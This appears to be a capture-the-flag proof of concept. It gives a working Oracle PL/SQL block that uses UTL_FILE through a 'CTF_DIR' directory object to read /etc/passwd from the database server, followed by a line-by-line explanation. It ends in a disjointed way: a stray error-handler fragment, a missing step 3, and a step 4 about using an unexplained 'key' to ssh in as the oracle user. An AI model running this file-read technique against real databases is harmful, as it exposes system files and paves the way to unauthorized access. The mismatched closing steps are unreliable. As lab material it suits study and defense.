### 📋 PoC: Read `/etc/passwd`

You'll need to run this in a tool like SQL*Plus or SQL Developer.

1. **First, enable output:**
```sql
SET SERVEROUTPUT ON;
```

You **must** run this first, or you won't see any output from the script.)

2. **Run the PL/SQL block:**

```sql
DECLARE
  v_file    UTL_FILE.FILE_TYPE;
  v_line    VARCHAR2(1024);
  v_dir     VARCHAR2(100) := 'CTF_DIR';
  v_filename VARCHAR2(100) := 'passwd';
BEGIN
  -- Open the file for reading
  v_file := UTL_FILE.FOPEN(v_dir, v_filename, 'r');

  -- Loop to read all lines
  LOOP
    BEGIN
      -- Read one line
      UTL_FILE.GET_LINE(v_file, v_line);

      -- Print the line to the output
      DBMS_OUTPUT.PUT_LINE(v_line);

    -- Exit loop when no more lines are found
    EXCEPTION
      WHEN NO_DATA_FOUND THEN
        EXIT;
    END;
  END LOOP;

  -- Close the file
  UTL_FILE.FCLOSE(v_file);

EXCEPTION
  -- Handle errors like 'file not found' or 'permission denied'
  WHEN OTHERS THEN
    DBMS_OUTPUT.PUT_LINE('Error: ' || SQLERRM);
    IF UTL_FILE.IS_OPEN(v_file) THEN
      UTL_FILE.FCLOSE(v_file);
    END IF;
END;
```

### ⚙️ How It Works

- `DECLARE`: This section sets up the variables we need:
    
    - `v_file`: A special variable type to hold the file "handle."
        
    - `v_line`: A string variable to store each line we read.
        
    - `v_dir`: Your directory object name. **Note:** Directory object names are case-sensitive. `CTF_DIR` is common.
        
    - `v_filename`: The file you want to read from within that directory (e.g., `passwd`, which points to `/etc/passwd`).
        
- `v_file := UTL_FILE.FOPEN(...)`: This is the function that opens the file. The `'r'` means "read mode."
    
- `LOOP ... END LOOP;`: This is the main loop that keeps running.
    
- `UTL_FILE.GET_LINE(v_file, v_line);`: This reads a single line from the file and puts it into the `v_line` variable.
    
- `DBMS_OUTPUT.PUT_LINE(v_line);`: This prints the line you just read.
    
- `EXCEPTION WHEN NO_DATA_FOUND THEN EXIT;`: When `GET_LINE` reaches the end of the file, it throws a `NO_DATA_FOUND` exception. We "catch" this exception and use it to `EXIT` the loop gracefully.
    
- `UTL_FILE.FCLOSE(v_file);`: This properly closes the file handle.
    
- `EXCEPTION WHEN OTHERS THEN ...`: This is a general error handler. If the file doesn't exist or the database user doesn't have operating system-level permissions to read `/etc/passwd`, this will catch the error and print it instead of crashing the script.

```sql
    DBMS_OUTPUT.PUT_LINE('--- An error occurred ---');
    DBMS_OUTPUT.PUT_LINE('Error: ' || SQLERRM);
END;
```
4. **Done, now let's use this key to ssh into the system as `oracle` user.
